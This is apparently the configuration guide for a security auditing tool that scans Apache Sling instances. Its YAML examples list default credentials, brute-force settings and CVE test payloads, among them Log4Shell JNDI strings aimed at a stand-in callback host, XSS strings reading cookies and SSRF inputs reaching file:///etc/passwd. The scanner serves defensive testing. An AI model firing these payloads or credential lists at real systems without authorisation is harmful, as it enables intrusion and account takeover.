---
layout: default
title: Configuration
permalink: /configuration
description: Complete configuration guide for Apache Sling Auditor. Learn how to customize scan modes, CVE definitions, paths, credentials, and security check settings via YAML configuration.
keywords: Apache Sling Auditor configuration, YAML config, scan mode settings, CVE configuration, security tool configuration
related:
  - title: Installation Guide
    url: /installation
    description: Install before configuring
  - title: CVE Detection
    url: /cve-detection
    description: Configure CVE detection
  - title: Usage Guide
    url: /usage
    description: Use your configuration
---

# Configuration Guide

Apache Sling Auditor is highly configurable via the `config/audit_config.yaml` file.

## Configuration File Location

The main configuration file is located at:

```
config/audit_config.yaml
```

## Configuration Structure

### Scan Modes

Define scan mode behavior:

```yaml
scan_modes:
  quick:
    max_requests_per_second: 10
    concurrent_requests: 3
    checks:
      - version_detection
      - basic_auth
      - critical_vulnerabilities
  
  full:
    max_requests_per_second: 20
    concurrent_requests: 5
    checks:
      - version_detection
      - authentication
      - vulnerabilities
      - exposed_apis
      - configuration
      - content_security
  
  stealth:
    max_requests_per_second: 5
    concurrent_requests: 2
    checks:
      - passive_version_detection
      - basic_auth
      - safe_checks
```

### Paths Configuration

Define paths to check:

```yaml
paths:
  core_endpoints:
    - path: /system/console
      name: Felix Console
      severity: critical
    - path: /crx/de/index.jsp
      name: CRXDE Lite
      severity: critical
  
  api_endpoints:
    - path: /bin/querybuilder.json
      name: Query Builder API
      severity: high
  
  sensitive_paths:
    - path: /etc/passwords
      name: Password Store
      severity: critical
```

### Default Credentials

Configure credentials to test:

```yaml
credentials:
  - username: admin
    password: admin
    description: Default Admin
  - username: author
    password: author
    description: Default Author
  - username: admin
    password: admin123
    description: Common Admin Variant
```

### CVE Definitions

Define vulnerabilities to test:

```yaml
vulnerabilities:
  CVE-2021-44228:
    name: Apache Log4j2 Remote Code Execution (Log4Shell)
    type: generic
    severity: critical
    description: Remote code execution via JNDI lookup
    affected_versions: "< 2.15.0"
    test_paths:
      - /system/console
      - /bin/querybuilder.json
    payloads:
      - "${jndi:ldap://oob-domain.com/a}"
      - "${jndi:dns://oob-domain.com}"
    headers:
      - X-Forwarded-For
      - User-Agent
      - X-Api-Version
    parameters:
      - q
      - property
    remediation: Update to Log4j 2.15.0 or higher
```

### Brute Force Configuration

Configure brute force testing:

```yaml
brute_force:
  enabled: true
  login_endpoints:
    - /system/sling/login
    - /libs/granite/core/content/login.html
  default_usernames:
    - admin
    - author
    - anonymous
  default_passwords:
    - admin
    - password
    - 123456
  rate_limiting:
    max_attempts: 5
    delay_seconds: 2
  lockout_detection:
    enabled: true
    lockout_indicators:
      - "account locked"
      - "too many attempts"
      - "please try again later"
```

## Customizing CVEs

### Adding a New CVE

To add a new CVE, add it to the `vulnerabilities` section:

```yaml
vulnerabilities:
  CVE-XXXX-XXXXX:
    name: Vulnerability Name
    type: xss|ssrf|path_traversal|info_disclosure|generic
    severity: critical|high|medium|low|info
    description: Vulnerability description
    affected_versions: "< 10.0"
    test_paths:
      - /path/to/test
    payloads:
      - payload1
      - payload2
    parameters:
      - param1
      - param2
    headers:
      - Header-Name
    remediation: Fix instructions
```

### CVE Types

- **xss**: Cross-Site Scripting vulnerabilities
- **ssrf**: Server-Side Request Forgery
- **path_traversal**: Path Traversal vulnerabilities
- **info_disclosure**: Information Disclosure
- **generic**: Generic vulnerability checks

### Example: XSS CVE

```yaml
CVE-2018-12809:
  name: Apache Sling XSS in Query Builder
  type: xss
  severity: medium
  description: Cross-site scripting vulnerability in Query Builder
  affected_versions: "< 10"
  test_paths:
    - /bin/querybuilder.json
  payloads:
    - "<img src=x onerror=alert(1)>"
    - "javascript:alert(document.domain)"
  parameters:
    - property
    - value
  remediation: Update to Apache Sling 10.0 or higher
```

### Example: SSRF CVE

```yaml
CVE-2020-11987:
  name: Apache Sling SSRF
  type: ssrf
  severity: high
  description: Server-Side Request Forgery in Sling servlets
  affected_versions: "< 11.4"
  test_paths:
    - /bin/querybuilder.json
  payloads:
    - "http://127.0.0.1:4502"
    - "http://localhost/system/console"
    - "file:///etc/passwd"
  parameters:
    - url
    - path
    - resource
  remediation: Update to Apache Sling 11.4 or higher
```

## Security Check Configuration

### Content Security

```yaml
security_checks:
  content_security:
    exclude_paths:
      - /content
      - /etc/clientlibs
    sensitive_patterns:
      - "password"
      - "secret"
      - "key"
```

### Authentication

```yaml
security_checks:
  authentication:
    test_default_credentials: true
    test_protected_paths: true
    session_validation: false
```

## Advanced Configuration

### Custom Headers

Add custom headers for testing:

```yaml
custom_headers:
  X-Custom-Header: "value"
  X-API-Key: "test"
```

### Custom Payloads

Add custom payloads for specific tests:

```yaml
custom_payloads:
  xss:
    - "<script>alert(1)</script>"
    - "javascript:alert(document.cookie)"
  ssrf:
    - "http://127.0.0.1"
    - "http://localhost"
```

### Rate Limiting

Configure rate limiting per mode:

```yaml
rate_limiting:
  quick:
    requests_per_second: 10
    delay_between_requests: 0.1
  full:
    requests_per_second: 20
    delay_between_requests: 0.05
  stealth:
    requests_per_second: 5
    delay_between_requests: 0.2
```

## Configuration Best Practices

### 1. Version-Specific Configuration

Use version detection to customize tests:

```yaml
version_specific_tests:
  "< 10.0":
    - CVE-2018-12809
    - CVE-2017-12617
  ">= 10.0":
    - CVE-2020-11987
```

### 2. Environment-Specific Paths

Customize paths based on environment:

```yaml
environment_paths:
  production:
    - /system/console
  development:
    - /system/console
    - /crx/de/index.jsp
```

### 3. Custom Wordlists

Reference custom wordlists:

```yaml
wordlists:
  paths: wordlists/custom_paths.txt
  usernames: wordlists/custom_usernames.txt
  passwords: wordlists/custom_passwords.txt
```

## Validation

The configuration file is validated on startup. Common errors:

- **Invalid YAML syntax**: Check indentation and formatting
- **Missing required fields**: Ensure all CVE definitions have required fields
- **Invalid severity**: Use only: critical, high, medium, low, info
- **Invalid type**: Use only: xss, ssrf, path_traversal, info_disclosure, generic

## Reloading Configuration

Configuration is loaded at startup. To apply changes:

1. Edit `config/audit_config.yaml`
2. Restart the auditor
3. Changes take effect immediately

## Configuration Examples

### Example 1: Focus on Critical CVEs

```yaml
scan_modes:
  quick:
    checks:
      - critical_vulnerabilities
      - version_detection
```

### Example 2: Custom Brute Force

```yaml
brute_force:
  login_endpoints:
    - /custom/login
  default_usernames:
    - custom_user
  default_passwords:
    - custom_pass
  rate_limiting:
    delay_seconds: 5
```

### Example 3: Extended Path Testing

```yaml
paths:
  custom_endpoints:
    - path: /custom/api
      name: Custom API
      severity: high
    - path: /admin/panel
      name: Admin Panel
      severity: critical
```

## Troubleshooting

### Configuration Not Loading

- Check YAML syntax
- Verify file path
- Check file permissions

### Tests Not Running

- Verify CVE definitions are correct
- Check scan mode configuration
- Review enabled checks

### False Positives

- Adjust detection patterns
- Review payload configurations
- Check severity levels

---

**Need help?** Check the [Usage Guide]({{ site.baseurl }}/usage) or review the default configuration file!

